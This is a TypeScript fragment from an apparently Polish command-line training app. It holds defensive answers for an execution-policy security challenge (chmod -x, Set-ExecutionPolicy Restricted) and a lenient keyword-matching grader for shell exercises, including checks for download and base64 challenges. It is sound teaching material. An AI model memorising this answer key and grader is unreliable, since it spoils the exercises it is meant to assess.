      bash: ["chmod -x malicious.sh", "chmod a-x malicious.sh", "chmod 644 malicious.sh"],
      zsh: ["chmod -x malicious.sh", "chmod a-x malicious.sh", "chmod 644 malicious.sh"],
      cmd: ["attrib +r malicious.sh"],
      powershell: [
        "Set-ExecutionPolicy Restricted",
        "Set-ExecutionPolicy Restricted -Scope CurrentUser",
        "Set-ExecutionPolicy -ExecutionPolicy Restricted"
      ]
    },
    tips: "W systemach Linux usunięcie uprawnienia uruchamiania odbywa się za pomocą 'chmod -x plik'. W systemach Windows PowerShell pozwala na ustawienie polityki uruchamiania za pomocą cmdletu 'Set-ExecutionPolicy Restricted', co uniemożliwi wykonywanie jakichwiek nieautoryzowanych skryptów lokalnych.",
    dangerExplanation: "Zbyt liberalne polityki uruchamiania skryptów (np. 'Bypass' w PowerShell) lub pozostawienie uprawnień do wykonywania pliku (+x) dla niezaufanych skryptów w systemach Unix/Linux otwiera drogę do natychmiastowej kompromitacji środowiska. Każdy program lub proces działający w kontekście zalogowanego użytkownika może wówczas bez przeszkód uruchomić szkodliwy skrypt, powodując infekcję ransomware, wyciek haseł, bądź utratę wszystkich poufnych danych."
  }
];

function normalize(cmd: string): string {
  return cmd
    .toLowerCase()
    .trim()
    .replace(/^[$%]\s*/, "") // Strip leading standard command prompts
    .replace(/^ps\s+[a-z]:\\(?:[^>]*>)?\s*/i, "") // Strip powershell prompts
    .replace(/^[a-z]:\\(?:[^>]*>)?\s*/i, "") // Strip Windows prompt
    .replace(/\s+/g, " ")
    .replace(/["']/g, ""); // strip quotes for fuzzy match
}

export function localEvaluateChallenge(
  challenge: Challenge,
  shell: ShellType,
  userCommand: string
): ChallengeEvaluationResult {
  const normUser = normalize(userCommand);
  const correctSolutions = challenge.solutions[shell];

  if (!correctSolutions || correctSolutions.length === 0) {
    return {
      isCorrect: false,
      feedback: `❌ Ta powłoka (${shell.toUpperCase()}) nie posiada zdefiniowanego wsparcia w tym wyzwaniu lub operacja jest niemożliwa.`,
      alternative: ""
    };
  }

  // Check for exact matching
  const hasExactMatch = correctSolutions.some((sol) => normalize(sol) === normUser);

  if (hasExactMatch) {
    return {
      isCorrect: true,
      feedback: `✨ Doskonale! Twoja komenda "${userCommand}" jest w pełni poprawna dla powłoki ${shell.toUpperCase()}. Realizuje dokładnie ten cel, który został postawiony w wyzwaniu. Świetna robota!`,
      alternative: correctSolutions[0],
      isOffline: true
    };
  }

  // Generic Fuzzy Check based on start of executable
  const canonicalCommand = correctSolutions[0];
  const canonicalParts = canonicalCommand.split(" ");
  const userParts = userCommand.trim().split(" ");
  const userExec = userParts[0].toLowerCase();
  const canonicalExec = canonicalParts[0].toLowerCase();

  // If user used correct command word but maybe parameters or paths vary slightly
  if (userExec === canonicalExec || 
      (userExec === "mkdir" && canonicalExec === "new-item") || 
      (userExec === "cd" && canonicalExec === "set-location") || 
      (userExec === "rm" && canonicalExec === "remove-item") || 
      (userExec === "cp" && canonicalExec === "copy-item") || 
      (userExec === "mv" && canonicalExec === "move-item") || 
      (userExec === "cat" && canonicalExec === "get-content") || 
      (userExec === "type" && canonicalExec === "get-content") ||
      challenge.id.startsWith("sec-")) {
    
    // Custom check for directories and files to make sure they named the targets correctly
    const containsKeyword = challenge.id === "create-dir" && normUser.includes("projekty") ||
                            challenge.id === "change-dir" && normUser.includes("projekty") ||
                            challenge.id === "create-empty-file" && normUser.includes("notatka.txt") ||
                            challenge.id === "copy-file" && normUser.includes("zrodlo.txt") && normUser.includes("kopia.txt") ||
                            challenge.id === "move-rename" && normUser.includes("stary.txt") && normUser.includes("nowy.txt") ||
                            challenge.id === "delete-file" && normUser.includes("dane.csv") ||
                            challenge.id === "open-default" && normUser.includes("index.html") ||
                            challenge.id === "cat-file" && normUser.includes("logi.txt") ||
                            challenge.id === "tail" && normUser.includes("serwer.log") && (normUser.includes("10") || normUser.includes("tail")) ||
                            challenge.id === "search-text" && normUser.includes("error") && normUser.includes("serwer.log") ||
                            challenge.id === "write-text" && normUser.includes("witaj") && normUser.includes("info.txt") ||
                            challenge.id === "count-lines" && normUser.includes("plik.txt") ||
                            challenge.id === "clipboard-copy" && normUser.includes("tekst") ||
                            challenge.id === "run-python" && normUser.includes("program.py") ||
                            challenge.id === "chmod" && normUser.includes("skrypt.sh") && (normUser.includes("+x") || normUser.includes("755")) ||
                            challenge.id === "kill-process" && normUser.includes("1234") ||
                            challenge.id === "ping-host" && normUser.includes("google.com") ||
                            challenge.id === "nslookup" && normUser.includes("google.com") ||
                            challenge.id === "traceroute" && normUser.includes("google.com") ||
                            challenge.id === "download-file" && normUser.includes("plik.zip") ||
                            challenge.id === "set-variable" && normUser.includes("api_key") && normUser.includes("secret123") ||
                            challenge.id === "get-variable" && normUser.includes("api_key") ||
                            challenge.id === "sec-curl-sh" && (normUser.includes("install.sh") || normUser.includes("install.ps1")) && (normUser.includes("curl") || normUser.includes("wget") || normUser.includes("webrequest") || normUser.includes("iwr") || normUser.includes("out-file") || normUser.includes("outfile")) ||
                            challenge.id === "sec-encoded-cmd" && (normUser.includes("base64") || normUser.includes("convert") || normUser.includes("unicode") || normUser.includes("getstring")) ||
                            challenge.id === "sec-exec-policy" && (normUser.includes("chmod") || normUser.includes("executionpolicy") || normUser.includes("restricted") || normUser.includes("allsigned") || normUser.includes("malicious.sh"));

    if (containsKeyword || challenge.id === "whoami" || challenge.id === "clear-screen" || challenge.id === "list-processes" || challenge.id === "system-info" || challenge.id === "macos-version" || challenge.id === "ip-config" || challenge.id === "cd-parent") {
      return {
        isCorrect: true,
        feedback: `✔️ Poprawnie! Twoje polecenie "${userCommand}" używa poprawnego programu głównego (${userExec}) oraz poprawnych parametrów docelowych. System zalicza to rozwiązanie!`,
        alternative: canonicalCommand,
        isOffline: true
      };
    }
  }

  // Fallback for failure
  return {
    isCorrect: false,
    feedback: `❌ Twoje polecenie "${userCommand}" nie jest w pełni poprawne dla powłoki ${shell.toUpperCase()}. Upewnij się, że wpisujesz poprawną nazwę komendy, poprawne flagi, parametry oraz prawidłowe nazwy plików i spróbuj ponownie. Możesz też skorzystać ze wskazówki!`,
    alternative: canonicalCommand,
    isOffline: true
  };
}
